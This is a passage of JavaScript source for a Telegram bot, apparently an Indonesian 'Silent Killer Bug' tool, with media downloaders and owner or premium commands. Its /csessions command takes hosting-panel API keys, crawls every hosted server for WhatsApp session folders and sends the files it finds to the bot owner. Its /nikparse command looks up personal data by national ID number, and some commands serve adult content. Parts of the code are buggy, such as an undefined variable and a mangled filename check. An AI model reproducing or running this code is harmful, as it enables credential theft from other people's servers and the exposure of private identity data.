                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📞 Chat WhatsApp", url: `https://wa.me/${cleanNumber}` }],
                        [{ text: "💬 Cek Grup", callback_data: `checkgroups_${cleanNumber}` }]
                    ]
                }
            });
        } else {
            await ctx.replyWithPhoto(thumbnailUrl, {
                caption: contactInfo,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📞 Chat WhatsApp", url: `https://wa.me/${cleanNumber}` }],
                        [{ text: "📊 Cek Detail", callback_data: `checkdetail_${cleanNumber}` }]
                    ]
                }
            });
        }

        await ctx.deleteMessage(processMsg.message_id);

    } catch (error) {
        console.error("Error checking contact:", error);
        await ctx.editMessageText(
            `❌ ☇ Gagal memeriksa kontak ${number}\nError: ${error.message}`,
            { chat_id: ctx.chat.id, message_id: processMsg.message_id }
        );
    }
});

bot.command("pinterest", async ctx => {
  const q = ctx.message.text.replace("/pinterest ", "")
  if (!q) return ctx.reply("Format: /pinterest Kucingg")

  const res = await axios.get(
    "https://id.pinterest.com/search/pins/?q=" + encodeURIComponent(q),
    { headers: { "User-Agent": "Mozilla/5.0" } }
  )

  const img = res.data.match(/https:\/\/i\.pinimg\.com\/originals\/[^"]+/)

  ctx.replyWithPhoto(img[0], { caption: q })
})

bot.command("ig", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text)
    return ctx.reply(
      "❌ Missing input. Please provide an Instagram post/reel URL.\n\nExample:\n/ig https://www.instagram.com/reel/xxxxxx/"
    );

  const url = text.trim();

  try {
    const apiUrl = `https://api.nvidiabotz.xyz/download/instagram?url=${encodeURIComponent(
      url
    )}`;

    const res = await fetch(apiUrl);
    const data = await res.json();

    if (!data?.result) {
      return ctx.reply("❌ Failed to fetch Instagram media. Please check the URL.");
    }

    const username = data.result.username || "-";

    if (data.result.video) {
      await ctx.replyWithVideo(data.result.video, {
        caption: `📸 Instagram Media\n\n👤 Author: ${username}`,
      });
    } else if (data.result.image) {
      await ctx.replyWithPhoto(data.result.image, {
        caption: `📸 Instagram Media\n\n👤 Author: ${username}`,
      });
    } else {
      ctx.reply("❌ Unsupported media type from Instagram.");
    }
  } catch (err) {
    console.error("Instagram API Error:", err);
    ctx.reply("❌ Error fetching Instagram media. Please try again later.");
  }
});

const memeks = [
  "spotify",
  "ytmusic",
  "joox",
  "soundcloud",
  "deezer",
  "applemusic",
  "amazonmusic",
  "audiomack",
  "resso",
  "play",
  "ytplay",
  "ytmp3",
  "song",
  "music"
]

// ambil command regex
const kwontol = new RegExp(`^\\/(${memeks.join("|")})\\s+(.+)`, "i")

async function fetchAPI(query) {
  try {
    const url = `http://api.ikyyxd.my.id/search/spotifyplay?query=${encodeURIComponent(query)}`

    const res = await axios.get(url, {
      timeout: 15000,
      validateStatus: () => true
    })

    if (res.status !== 200 || !res.data?.status) {
      return null
    }

    return res.data.result

  } catch (err) {
    console.log("API ERROR:", err.message)
    return null
  }
}

async function sendAudioSafe(ctx, data) {
  try {
    return await ctx.replyWithAudio(
      { url: data.download },
      {
        title: data.title || "Unknown",
        performer: data.artist || "Unknown",
        caption:
`🎵 ${data.title || "Unknown"}
👤 ${data.artist || "Unknown"}
⏱ ${data.duration || "Unknown"}`
      }
    )

  } catch (err) {

    return await ctx.replyWithDocument(
      { url: data.download },
      {
        caption:
`🎵 ${data.title || "Unknown"}
👤 ${data.artist || "Unknown"}`
      }
    )
  }
}

// handler command
bot.hears(kwontol, async (ctx) => {
  try {
    const text = ctx.message.text
    const match = text.match(kwontol)

    if (!match) return

    const cmd = match[1]
    const query = match[2]

    await ctx.sendChatAction("upload_document")

    const data = await fetchAPI(query)

    if (!data || !data.download) {
      return ctx.reply(`❌ (${cmd}) Lagu tidak ditemukan`)
    }

    await sendAudioSafe(ctx, data)

  } catch (err) {
    console.log("ERROR:", err.message)
    ctx.reply("❌ Gagal kirim audio")
  }
})

bot.command("cekfunc", async (ctx) => {
  const reply = ctx.message.reply_to_message;

  if (!reply) {
    return ctx.reply("⚠️ Reply file atau teks yang mau dicek!");
  }

  let code = "";

  try {
    // kalau file (.js / .txt)
    if (reply.document) {
      const file = await ctx.telegram.getFile(reply.document.file_id);
      const link = `https://api.telegram.org/file/bot${process.env.BOT_TOKEN}/${file.file_path}`;

      const res = await fetch(link);
      code = await res.text();
    } 
    // kalau teks biasa
    else if (reply.text) {
      code = reply.text;
    } else {
      return ctx.reply("❌ Format tidak didukung");
    }

    let hasil = "📂 *Hasil Scan Function*\n\n";

    // regex semua jenis function
    const patterns = [
      /function\s+(\w+)\s*\([^)]*\)\s*{[\s\S]*?}/g,
      /async\s+function\s+(\w+)\s*\([^)]*\)\s*{[\s\S]*?}/g,
      /const\s+(\w+)\s*=\s*async\s*\([^)]*\)\s*=>\s*{[\s\S]*?}/g,
      /const\s+(\w+)\s*=\s*\([^)]*\)\s*=>\s*{[\s\S]*?}/g,
      /const\s+(\w+)\s*=\s*\([^)]*\)\s*=>\s*[^;\n]+/g
    ];

    let found = [];

    for (let pattern of patterns) {
      let match;
      while ((match = pattern.exec(code)) !== null) {
        found.push({
          name: match[1] || "anonymous",
          body: match[0]
        });
      }
    }

    if (found.length === 0) {
      return ctx.reply("❌ Tidak ada function ditemukan");
    }

    for (let fn of found) {
      try {
        new Function(fn.body);
        hasil += `✅ ${fn.name}\n`;

      } catch (err) {
        let line = "?";
        let col = "?";
        let isi = "";

        const match = err.stack.match(/<anonymous>:(\d+):(\d+)/);

        if (match) {
          line = match[1];
          col = match[2];

          const lines = fn.body.split("\n");
          isi = lines[line - 1] || "";
        }

        hasil += `💥 ${fn.name}\n`;
        hasil += `   🛠️ ${err.message}\n`;
        hasil += `   📍 ${line}:${col}\n`;
        hasil += `   📄 ${isi.trim()}\n\n`;
      }
    }

    ctx.reply(hasil, { parse_mode: "Markdown" });

  } catch (err) {
    ctx.reply(" Gagal membaca file!");
  }
});

bot.command("tiktokdl", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("🪧 Format: /tiktokdl https://vt.tiktok.com/ZSUeF1CqC/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ ☇ Sedang memproses video");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return ctx.reply("❌ ☇ Gagal ambil data video pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = await Promise.all(
        imgs.map(async (img) => {
          const res = await axios.get(img, { responseType: "arraybuffer" });
          return {
            type: "photo",
            media: { source: Buffer.from(res.data) }
          };
        })
      );
      await ctx.replyWithMediaGroup(media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl) return ctx.reply("❌ ☇ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36"
      },
      timeout: 30000
    });

    await ctx.replyWithVideo(
      { source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` },
      { supports_streaming: true }
    );
  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ ☇ Error ${e.response.status} saat mengunduh video`
        : "❌ ☇ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});

bot.command("nikparse", checkPremium, async (ctx) => {
  const nik = ctx.message.text.split(" ").slice(1).join("").trim();
  if (!nik) return ctx.reply("🪧 Format: /nikparse 1234567890283625");
  if (!/^\d{16}$/.test(nik)) return ctx.reply("❌ ☇ NIK harus 16 digit angka");

  const wait = await ctx.reply("⏳ ☇ Sedang memproses pengecekan NIK");

const replyHTML = (d) => {
  const get = (x) => (x ?? "-");

  const caption =`
<blockquote><pre>⬡═―—⊱ ⎧ 𝑺𝒊𝒍𝒆𝒏𝒕 𝑲𝒊𝒍𝒍𝒆𝒓 𝑩𝒖𝒈 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ NIK: ${get(d.nik) || nik}
⌑ Nama: ${get(d.nama)}
⌑ Jenis Kelamin: ${get(d.jenis_kelamin || d.gender)}
⌑ Tempat Lahir: ${get(d.tempat_lahir || d.tempat)}
⌑ Tanggal Lahir: ${get(d.tanggal_lahir || d.tgl_lahir)}
⌑ Umur: ${get(d.umur)}
⌑ Provinsi: ${get(d.provinsi || d.province)}
⌑ Kabupaten/Kota: ${get(d.kabupaten || d.kota || d.regency)}
⌑ Kecamatan: ${get(d.kecamatan || d.district)}
⌑ Kelurahan/Desa: ${get(d.kelurahan || d.village)}
`;

  return ctx.reply(caption, { parse_mode: "HTML", disable_web_page_preview: true });
};

  try {
    const a1 = await axios.get(
      `https://api.akuari.my.id/national/nik?nik=${nik}`,
      { headers: { "user-agent": "Mozilla/5.0" }, timeout: 15000 }
    );

    if (a1?.data?.status && a1?.data?.result) {
      await replyHTML(a1.data.result);
    } else {
      const a2 = await axios.get(
        `https://api.nikparser.com/nik/${nik}`,
        { headers: { "user-agent": "Mozilla/5.0" }, timeout: 15000 }
      );
      if (a2?.data) {
        await replyHTML(a2.data);
      } else {
        await ctx.reply("❌ ☇ NIK tidak ditemukan");
      }
    }
  } catch (e) {
    try {
      const a2 = await axios.get(
        `https://api.nikparser.com/nik/${nik}`,
        { headers: { "user-agent": "Mozilla/5.0" }, timeout: 15000 }
      );
      if (a2?.data) {
        await replyHTML(a2.data);
      } else {
        await ctx.reply("❌ ☇ Gagal menghubungi api, Coba lagi nanti");
      }
    } catch {
      await ctx.reply("❌ ☇ Gagal menghubungi api, Coba lagi nanti");
    }
  } finally {
    try { await ctx.deleteMessage(wait.message_id); } catch {}
  }
});

bot.command("toblur", async (ctx) => {
  const reply = ctx.message.reply_to_message;
  if (!reply || !reply.photo)
    return ctx.reply("❌ Reply ke foto dulu!");

  try {
    const loading = await ctx.reply("⏳ Memproses blur...");

    const photo = reply.photo.at(-1);
    const fileLink = await ctx.telegram.getFileLink(photo.file_id);

    await ctx.telegram.editMessageText(ctx.chat.id, loading.message_id, null, "✅ Blur selesai, mengirim foto...");
    await ctx.replyWithPhoto({ url: `https://ikyyzyyrestapi.my.id/image/blur?url=${encodeURIComponent(fileLink.href)}` });

  } catch (err) {
    console.error(err);
    ctx.reply("❌ Gagal memproses foto!");
  }
});

bot.command("setcd", async (ctx) => {
    if (ctx.from.id != OWNER_ID) {
        return ctx.reply("<blockquote>❌ ☇ Acces Hanya Untuk Pemilik Kontol</blockquote>", { parse_mode: "HTML" });
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcd 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("selsension", async (ctx) => {
  if (ctx.from.id != OWNER_ID) {
    return ctx.reply("<blockquote>❌ ☇ Acces Hanya Untuk Pemilik Kontol</blockquote>", { parse_mode: "HTML" });
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        return;
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command('addprem', async (ctx) => {
    if (ctx.from.id != OWNER_ID) {
        return ctx.reply("<blockquote>❌ ☇ Acces Hanya Untuk Pemilik Kontol</blockquote>", { parse_mode: "HTML" });
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("<blockquote>🪧 ☇ Format: /addprem 12345678 30d</blockquote>", { parse_mode: "HTML" });
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("<blockquote>🪧 ☇ Durasi harus berupa angka dalam hari</blockquote>", { parse_mode: "HTML" });
    }
    const expiryDate = addPremiumUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

bot.command('delprem', async (ctx) => {
    if (ctx.from.id != OWNER_ID) {
        return ctx.reply("<blockquote>❌ ☇ Acces Hanya Untuk Pemilik Kontol</blockquote>", { parse_mode: "HTML" });
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem 12345678");
    }
    const userId = args[1];
    removePremiumUser(userId);
        ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

bot.command('addgc', async (ctx) => {
    if (ctx.from.id != OWNER_ID) {
        return ctx.reply("<blockquote>❌ ☇ Acces Hanya Untuk Pemilik Kontol</blockquote>", { parse_mode: "HTML" });
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addgc -12345678 30d");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    savePremiumUsers(premiumUsers);

    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
});

bot.command('delgc', async (ctx) => {
    if (ctx.from.id != OWNER_ID) {
        return ctx.reply("<blockquote>❌ ☇ Acces Hanya Untuk Pemilik Kontol</blockquote>", { parse_mode: "HTML" });
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delgc -12345678");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
    } else {
        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium`);
    }
});

bot.command("csessions", checkPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  const fromId = ctx.from.id;

  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("🪧 ☇ Format: /csessions https://domainpanel.com,ptla_123,ptlc_123");

  const args = text.split(",");
  const domain = args[0];
  const plta = args[1];
  const pltc = args[2];
  if (!plta || !pltc)
    return ctx.reply("🪧 ☇ Format: /csessions https://panelku.com,plta_123,pltc_123");

  await ctx.reply(
    "⏳ ☇ Sedang scan semua server untuk mencari folder sessions dan file creds.json",
    { parse_mode: "Markdown" }
  );

  const base = domain.replace(/\/+$/, "");
  const commonHeadersApp = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${plta}`,
  };
  const commonHeadersClient = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${pltc}`,
  };

  function isDirectory(item) {
    if (!item || !item.attributes) return false;
    const a = item.attributes;
    if (typeof a.is_file === "boolean") return a.is_file === false;
    return (
      a.type === "dir" ||
      a.type === "directory" ||
      a.mode === "dir" ||
      a.mode === "directory" ||
      a.mode === "d" ||
      a.is_directory === true ||
      a.isDir === true
    );
  }

  async function listAllServers() {
    const out = [];
    let page = 1;
    while (true) {
      const r = await axios.get(`${base}/api/application/servers`, {
        params: { page },
        headers: commonHeadersApp,
        timeout: 15000,
      }).catch(() => ({ data: null }));
      const chunk = (r && r.data && Array.isArray(r.data.data)) ? r.data.data : [];
      out.push(...chunk);
      const hasNext = !!(r && r.data && r.data.meta && r.data.meta.pagination && r.data.meta.pagination.links && r.data.meta.pagination.links.next);
      if (!hasNext || chunk.length === 0) break;
      page++;
    }
    return out;
  }

  async function traverseAndFind(identifier, dir = "/") {
    try {
      const listRes = await axios.get(
        `${base}/api/client/servers/${identifier}/files/list`,
        {
          params: { directory: dir },
          headers: commonHeadersClient,
          timeout: 15000,
        }
      ).catch(() => ({ data: null }));
      const listJson = listRes.data;
      if (!listJson || !Array.isArray(listJson.data)) return [];
      let found = [];

      for (let item of listJson.data) {
        const name = (item.attributes && item.attributes.name) || item.name || "";
        const itemPath = (dir === "/" ? "" : dir) + "/" + name;
        const normalized = itemPath.replace(/\/+/g, "/");
        const lower = name.toLowerCase();

        if ((lower === "session" || lower === "sessions") && isDirectory(item)) {
          try {
            const sessRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/list`,
              {
                params: { directory: normalized },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));
            const sessJson = sessRes.data;
            if (sessJson && Array.isArray(sessJson.data)) {
              for (let sf of sessJson.data) {
                const sfName = (sf.attributes && sf.attributes.name) || sf.name || "";
                const sfPath = (normalized === "/" ? "" : normalized) + "/" + sfName;
                if (sfName.toLowerCase() === "sension, sensions") {
                  found.push({
                    path: sfPath.replace(/\/+/g, "/"),
                    name: sfName,
                  });
                }
              }
            }
          } catch (_) {}
        }

        if (isDirectory(item)) {
          try {
            const more = await traverseAndFind(identifier, normalized === "" ? "/" : normalized);
            if (more.length) found = found.concat(more);
          } catch (_) {}
        } else {
          if (name.toLowerCase() === "sension, sensions") {
            found.push({ path: (dir === "/" ? "" : dir) + "/" + name, name });
          }
        }
      }
      return found;
    } catch (_) {
      return [];
    }
  }

  try {
    const servers = await listAllServers();
    if (!servers.length) {
      return ctx.reply("❌ ☇ Tidak ada server yang bisa discan");
    }

    let totalFound = 0;

    for (let srv of servers) {
      const identifier =
        (srv.attributes && srv.attributes.identifier) ||
        srv.identifier ||
        (srv.attributes && srv.attributes.id);
      const name =
        (srv.attributes && srv.attributes.name) ||
        srv.name ||
        identifier ||
        "unknown";
      if (!identifier) continue;

      const list = await traverseAndFind(identifier, "/");
      if (list && list.length) {
        for (let fileInfo of list) {
          totalFound++;
          const filePath = ("/" + fileInfo.path.replace(/\/+/g, "/")).replace(/\/+$/,"");

          await ctx.reply(
            `📁 ☇ Ditemukan sension di server ${name} path: ${filePath}`,
            { parse_mode: "Markdown" }
          );

          try {
            const downloadRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/download`,
              {
                params: { file: filePath },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));

            const dlJson = downloadRes && downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
              const url = dlJson.attributes.url;
              const fileRes = await axios.get(url, {
                responseType: "arraybuffer",
                timeout: 20000,
              });
              const buffer = Buffer.from(fileRes.data);
              await ctx.telegram.sendDocument(OWNER_ID, {
                source: buffer,
                filename: `${String(name).replace(/\s+/g, "_")}_sensions`,
              });
            } else {
              await ctx.reply(
                `❌ ☇ Gagal mendapatkan URL download untuk ${filePath} di server ${name}`
              );
            }
          } catch (e) {
            console.error(`Gagal download ${filePath} dari ${name}:`, e?.message || e);
            await ctx.reply(
              `❌ ☇ Error saat download file creds.json dari ${name}`
            );
          }
        }
      }
    }

    if (totalFound === 0) {
      return ctx.reply("✅ ☇ Scan selesai tidak ditemukan creds.json di folder session/sessions pada server manapun");
    } else {
      return ctx.reply(`✅ ☇ Scan selesai total file creds.json berhasil diunduh & dikirim: ${totalFound}`);
    }
  } catch (err) {
    ctx.reply("❌ ☇ Terjadi error saat scan");
  }
});

bot.command("addbot", async (ctx) => {
   if (ctx.from.id != OWNER_ID) {
        return ctx.reply("<blockquote>❌ ☇ Acces Hanya Untuk Pemilik Kontol</blockquote>", { parse_mode: "HTML" });
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /addbot 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber);  
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `
<blockquote>⬡═―—⊱ ⎧ 𝙋 𝘼 𝙄 𝙍 𝙄 𝙉 𝙂  ☇  𝘾 𝙊 𝘿 𝙀 ⎭ ⊰―—═⬡</blockquote>
⌑ Developer : zhatanixx.t.me
⌑ Number: ${phoneNumber}
⌑ Pairing Code: <code>${formattedCode}</code>
⌑ Status: Not Connected ❌`;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

bot.command("catbox", checkPremium, async (ctx) => {
  const r = ctx.message.reply_to_message;
  if (!r) return ctx.reply("🪧 ☇ Format: /catbox ( reply dengan foto/video )");

  let fileId = null;
  if (r.photo && r.photo.length) {
    fileId = r.photo[r.photo.length - 1].file_id;
  } else if (r.video) {
    fileId = r.video.file_id;
  } else if (r.video_note) {
    fileId = r.video_note.file_id;
  } else {
    return ctx.reply("❌ ☇ Hanya mendukung foto atau video");
  }

  const wait = await ctx.reply("⏳ ☇ Mengambil file & mengunggah ke catbox");

  try {
    const tgLink = String(await ctx.telegram.getFileLink(fileId));

    const params = new URLSearchParams();
    params.append("reqtype", "urlupload");
    params.append("url", tgLink);

    const { data } = await axios.post("https://catbox.moe/user/api.php", params, {
      headers: { "content-type": "application/x-www-form-urlencoded" },
      timeout: 30000
    });

    if (typeof data === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(data.trim())) {
      await ctx.reply(data.trim());
    } else {
      await ctx.reply("❌ ☇ Gagal upload ke catbox" + String(data).slice(0, 200));
    }
  } catch (e) {
    const msg = e?.response?.status
      ? `❌ ☇ Error ${e.response.status} saat unggah ke catbox`
      : "❌ ☇ Gagal unggah coba lagi.";
    await ctx.reply(msg);
  } finally {
    try { await ctx.deleteMessage(wait.message_id); } catch {}
  }
});

bot.command('iqc', async (ctx) => {
  try {
    const args = ctx.message.text.split(' ').slice(1);
    if (args.length < 3) {
      return ctx.reply('Gunakan format:\n/iqc <pesan> <baterai> <operator>\n\nContoh:\n/iphone Halo dunia 87 Telkomsel');
    }

    // Gabung argumen, misalnya: [ 'Halo', 'dunia', '87', 'Telkomsel' ]
    const battery = args[args.length - 2];       // misal 87
    const carrier = args[args.length - 1];       // misal Telkomsel
    const text = args.slice(0, -2).join(' ');    // sisanya jadi pesan
    const time = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' });

    await ctx.reply('⏳ Membuat quoted message gaya iPhone...');

    // 🔗 Build API URL
    const apiUrl = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&messageText=${encodeURIComponent(text)}&carrierName=${encodeURIComponent(carrier)}&batteryPercentage=${encodeURIComponent(battery)}&signalStrength=4&emojiStyle=apple`;

    // Ambil hasil gambar dari API
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
    const buffer = Buffer.from(response.data, 'binary');

    // Kirim gambar hasil API ke user
    await ctx.replyWithPhoto({ source: buffer }, { caption: `📱 iPhone quote dibuat!\n🕒 ${time}` });
  } catch (err) {
    console.error('❌ Error case /iqc:', err);
    await ctx.reply('Terjadi kesalahan saat memproses gambar.');
  }
});

bot.command("nfsw", checkPremium, async (ctx) => {
  const r = ctx.message.reply_to_message;
  if (!r) return ctx.replyWithPhoto("https://files.catbox.moe/fw550e.jpg", "https://files.catbox.moe/20mu8c.jpg", "https://files.catbox.moe/vchvns.jpg", "https://files.catbox.moe/v9sc86.jpg");
});

bot.command("asupan", checkPremium, async (ctx) => {
  const args = ctx.message.text.split("asupan").slice(1).join(" ").trim();
  if (!args) return ctx.replyWithVideo("https://files.catbox.moe/u47e1q.mp4", "https://files.catbox.moe/j87gkz.mp4", "https://files.catbox.moe/b1zhjd.mp4", "https://files.catbox.moe/unp49a.mp4");
});

bot.command("anime", async (ctx) => {
  try { const { data } = await axios.get("https://api.waifu.pics/sfw/waifu"); await ctx.replyWithPhoto(data.url); }
  catch { ctx.reply("❌ Gagal mengambil gambar anime"); }
});
bot.command("waifu", async (ctx) => {
  try { const { data } = await axios.get("https://api.waifu.pics/sfw/waifu"); await ctx.replyWithPhoto(data.url,{caption:"🌸 Waifu (SFW)"}); }
  catch { ctx.reply("❌ Gagal mengambil waifu"); }
});

bot.command('nhentai', async (ctx) => {
    const input = ctx.message.text.split(' ').slice(1);
    const query = input[0];
    const page = input[1] || 1;

    if (!query) {
      return ctx.reply('Gunakan format:\n/nhentai <query> <page>');
    }

    try {
      const res = await axios.get(`https://fastrestapis.fasturl.cloud/comic/nhentaisearch?query=${encodeURIComponent(query)}&page=${page}`, {
        headers: {
          'accept': 'application/json',
        },
      });

      const comics = res.data.result.comics;
      if (!comics || comics.length === 0) {
        return ctx.reply('Tidak ditemukan hasil untuk query tersebut.');
      }

      for (const comic of comics.slice(0, 10)) {
        await ctx.replyWithPhoto(
          { url: comic.thumb },
          {
            caption: `📚 *${comic.title}*\n🔗 [Buka Galeri](${comic.url})`,
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
              Markup.button.url('🔗 Buka di NHentai', comic.url)
            ])
          }
        );
      }
    } catch (err) {
      console.error('NHentai error:', err);
      ctx.reply('Gagal mengambil data dari NHentai.');
    }
});

// ================== COMMAND ==================
bot.command("info", async (ctx) => {
  const msg = ctx.message;

  const target = msg.reply_to_message
    ? msg.reply_to_message.from
    : msg.from;

  const chatId = ctx.chat.id;
  const userId = target.id;

  // ===== USER BASIC =====
  const username = target.username ? "@" + target.username : "Tidak ada";
  const mention = `<a href="tg://user?id=${userId}">${target.first_name}</a>`;

  // ===== ROLE GROUP =====
  let role = "Member";
  try {
    const member = await ctx.getChatMember(userId);
    if (member.status === "creator") role = "👑 Owner";
    else if (member.status === "administrator") role = "🛡️ Admin";
  } catch {}

  // ===== BADGE =====
  const badge = target.is_bot ? "🤖 Bot" : "👤 User";

  // ===== PHOTO =====
  let fileId = null;
  try {
    const profile = await ctx.telegram.getUserProfilePhotos(userId);
    if (profile.photos.length > 0) {
      fileId = profile.photos[0][0].file_id;
    }
  } catch {}

  // ===== CAPTION =====
  const caption = `
<blockquote>(👑) 𝙄𝙉𝙁𝙊 𝙐𝙎𝙀𝙍 (👑)</blockquote>
${mention}

🆔 ID: <code>${userId}</code>
👤 Nama: ${target.first_name}
🔗 Username: ${username}
🎭 Role: ${role}
🏷️ Status: ${badge}
<blockquote>𝙿𝚘𝚠𝚎𝚛𝚎𝚍 𝙱𝚢 𝚆𝚒𝚍𝚒𝚡 𝙵𝚕𝚘𝚠𝚛𝚜</blockquote>
`;

  const keyboard = {
    inline_keyboard: [
      [
        { text: "(🔄) 𝚁𝚎𝚏𝚛𝚎𝚜𝚑", callback_data: `refresh_${userId}`, style: "primary", icon_custom_emoji_id: "5352759161945867747" }
      ],
      [
        { text: "(📸) 𝙿𝚛𝚘𝚏𝚒𝚕 𝚄𝚜𝚎𝚛", url: `tg://user?id=${userId}`, style: "success", icon_custom_emoji_id: "5085022089103016925" }
      ],
      [ 
        { text: "𝙆𝙞𝙣𝙜", url: 't.me/zhatanixx', style: "danger", icon_custom_emoji_id: "5084613633418199991" }
      ]
    ]
  };

  if (fileId) {
    return ctx.replyWithPhoto(fileId, {
      caption,
      parse_mode: "HTML",
      reply_markup: keyboard
    });
  }

  return ctx.reply(caption, {
    parse_mode: "HTML",
    reply_markup: keyboard
  });
});
// ================== REFRESH ==================
bot.action(/refresh_(\d+)/, async (ctx) => {
  await ctx.answerCbQuery("🔄 Updating...");

  const userId = parseInt(ctx.match[1]);

  try {
    const user = ctx.from;

    const username = user.username ? "@" + user.username : "Tidak ada";
    const mention = `<a href="tg://user?id=${userId}">${user.first_name}</a>`;

    let role = "Member";
    try {
      const member = await ctx.getChatMember(userId);
      if (member.status === "creator") role = "👑 Owner";
      else if (member.status === "administrator") role = "🛡️ Admin";
    } catch {}

    const badge = user.is_bot ? "🤖 Bot" : "👤 User";

    let fileId = null;
    const profile = await ctx.telegram.getUserProfilePhotos(userId);
    if (profile.photos.length > 0) {
      fileId = profile.photos[0][0].file_id;
    }

    const caption = `
<blockquote>(👑) 𝙄𝙉𝙁𝙊 𝙐𝙎𝙀𝙍 𝙍𝙀𝙁𝙍𝙀𝙎𝙃 (👑)</blockquote>
${mention}

🆔 ID: <code>${userId}</code>
👤 Nama: ${target.first_name}
🔗 Username: ${username}
🎭 Role: ${role}
🏷️ Status: ${badge}
<blockquote>𝙿𝚘𝚠𝚎𝚛𝚎𝚍 𝙱𝚢 𝚆𝚒𝚍𝚒𝚡 𝙵𝚕𝚘𝚠𝚛𝚜</blockquote>
`;

    if (fileId) {
      return ctx.editMessageMedia(
        {
          type: "photo",
